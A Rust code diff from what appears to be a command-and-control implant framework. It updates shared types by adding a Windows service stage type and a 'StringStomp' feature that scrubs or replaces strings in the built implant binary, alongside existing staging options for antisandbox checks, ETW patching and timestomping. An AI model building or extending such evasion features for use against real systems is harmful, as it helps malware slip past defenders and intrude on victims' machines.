@@ -1,13 +1,13 @@
 use core::panic;
 use serde::{Deserialize, Serialize};
 use std::{
-    collections::BTreeMap,
+    collections::{BTreeMap, HashSet},
     fmt::{Debug, Display},
     mem::transmute,
     path::PathBuf,
 };
 
-use crate::task_types::{BuildAllBins, FileCopyInner, RegAddInner, RegQueryInner};
+use crate::task_types::{FileCopyInner, RegAddInner, RegQueryInner};
 
 /// Commands supported by the implant and C2.
 ///
@@ -15,7 +15,7 @@ use crate::task_types::{BuildAllBins, FileCopyInner, RegAddInner, RegQueryInner}
 ///
 /// # Safety
 /// We are using 'C' style enums to avoid needing serde to ser/deser types through the network.
-/// When interpreting a command integer, it **MUST** in all cases, be interpreted by [std::mem::transmute]
+/// When interpreting a command integer, it **MUST** in all cases, be interpreted by [`std::mem::transmute`]
 /// as a `u32`, otherwise you risk UB.
 #[repr(u32)]
 #[derive(Serialize, Deserialize, Copy, Clone, PartialEq, Eq)]
@@ -111,7 +111,7 @@ impl From<&str> for FileDropMetadata {
         // around the ordering and content of contained data.
         //
 
-        let parts: Vec<&str> = value.split(",").collect();
+        let parts: Vec<&str> = value.split(',').collect();
 
         assert_eq!(parts.len(), 3);
 
@@ -312,6 +312,10 @@ impl<T: Serialize> Default for WyrmResult<T> {
 }
 
 impl<T: Serialize> WyrmResult<T> {
+    /// Unwraps a wyrm result.
+    ///
+    /// # Panics
+    /// This function will panic with no output error (OPSEC) if unwrap failed.
     pub fn unwrap(self) -> T {
         match self {
             WyrmResult::Ok(x) => x,
@@ -368,28 +372,32 @@ pub struct NewAgentStaging {
     pub jitter: Option<u64>,
     pub timestomp: Option<String>,
     pub exports: Exports,
+    pub svc_name: String,
+    pub string_stomp: Option<StringStomp>,
 }
 
 impl NewAgentStaging {
-    pub fn from_staged_file_metadata(staging_endpoint: &String, download_name: &String) -> Self {
+    pub fn from_staged_file_metadata(staging_endpoint: &str, download_name: &str) -> Self {
         NewAgentStaging {
             implant_name: "-".into(),
             default_sleep_time: 0,
             c2_address: "-".into(),
             c2_endpoints: vec!["-".into()],
-            staging_endpoint: staging_endpoint.clone(),
-            pe_name: download_name.clone(),
+            staging_endpoint: staging_endpoint.to_owned(),
+            pe_name: download_name.to_owned(),
             port: 1,
             agent_security_token: "-".into(),
             antisandbox_trig: false,
             antisandbox_ram: false,
             stage_type: StageType::Exe,
             build_debug: false,
-            useragent: "".into(),
+            useragent: String::new(),
             patch_etw: false,
             jitter: None,
             timestomp: None,
             exports: None,
+            svc_name: "-".to_string(),
+            string_stomp: None,
         }
     }
 }
@@ -398,6 +406,7 @@ impl NewAgentStaging {
 pub enum StageType {
     Dll,
     Exe,
+    Svc,
     All,
 }
 
@@ -406,6 +415,7 @@ impl Display for StageType {
         match self {
             StageType::Dll => write!(f, "dll"),
             StageType::Exe => write!(f, "exe"),
+            StageType::Svc => write!(f, "svc"),
             StageType::All => write!(f, "all"),
         }
     }
@@ -467,4 +477,63 @@ pub type Exports = Option<BTreeMap<String, ExportConfig>>;
 #[derive(Serialize, Deserialize, Debug, Default, Clone)]
 pub struct ExportConfig {
     pub machine_code: Option<Vec<u8>>,
+}
+
+#[derive(Serialize, Deserialize, Debug, Default, Clone)]
+pub struct StringStomp {
+    /// Strings to remove with zeros from the binary
+    pub remove: Option<HashSet<String>>,
+    /// Strings to replace in the binary
+    pub replace: Option<BTreeMap<String, String>>,
+}
+
+impl StringStomp {
+    /// Creates a new [`StringStomp`] from optional input lists of the correct type. The function will
+    /// add a null byte to the end of each string if it does not exist so that it is compatible with
+    /// searching for proper null terminated strings.
+    pub fn from(string_stomp: &Option<StringStomp>) -> Option<Self> {
+        let string_stomp = match string_stomp {
+            Some(s) => s,
+            None => return None,
+        };
+
+        let remove = {
+            if let Some(inner) = &string_stomp.remove {
+                let mut r = HashSet::with_capacity(inner.len());
+
+                for s in inner.iter() {
+                    let builder = s.to_owned();
+                    let mut builder = builder.replace(r"\\", r"\");
+
+                    if !builder.ends_with('\0') {
+                        builder.push('\0');
+                    }
+
+                    r.insert(builder);
+                }
+
+                Some(r)
+            } else {
+                None
+            }
+        };
+
+        let replace = {
+            if let Some(inner) = &string_stomp.replace {
+                let mut r = BTreeMap::new();
+
+                for (k, v) in inner.iter() {
+                    let k_builder = k.to_owned();
+                    let v_builder = v.to_owned();
+                    r.insert(k_builder, v_builder);
+                }
+
+                Some(r)
+            } else {
+                None
+            }
+        };
+
+        Some(Self { remove, replace })
+    }
 }
